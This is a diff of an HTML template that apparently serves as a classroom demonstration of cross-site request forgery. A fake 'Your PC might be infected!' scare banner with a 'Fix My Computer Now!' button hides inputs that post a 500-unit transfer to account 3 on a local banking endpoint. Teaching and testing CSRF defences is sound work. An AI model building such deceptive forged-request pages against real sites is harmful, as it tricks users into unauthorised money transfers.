@@ -1,10 +1,33 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml"
+      xmlns:th="http://www.thymeleaf.org">
+<head>
+    <style type="text/css">
+        .virus {
+            width: 400px;
+            background-color: red;
+            border: 5px solid darkred;
+            padding: 25px;
+            text-align: center;
+        }
+        input {
+            font-size: 2em;
+        }
+    </style>
+</head>
+
+<body>
 <h1>Bad Site Virus Remover</h1>
-<form action="http://localhost:8080/account/transfer" method="post">
-    <label for="account">Account</label>
-    <input id="account" type="text" name="account" value="3"/>
 
-    <label for="amount">Amount</label>
-    <input id="amount" type="text" name="amount" value="500"/>
+<div class="virus">
+    <image th:src="@{images/skull-and-crossbones.svg}" width="75" style="float:left"/>
+    <image th:src="@{images/skull-and-crossbones.svg}" width="75" style="float:right"/>
+    <h2>Your PC might be infected!</h2>
+    <h3>Clean it now!</h3>
+    <form action="http://localhost:8080/account/transfer" method="post">
+        <input type="hidden" name="account" value="3"/>
+        <input type="hidden" name="amount" value="500"/>
+        <input type="submit" value="Fix My Computer Now!"/>
+    </form>
+</div>
 
-    <input type="submit" value="Submit"/>
-</form>
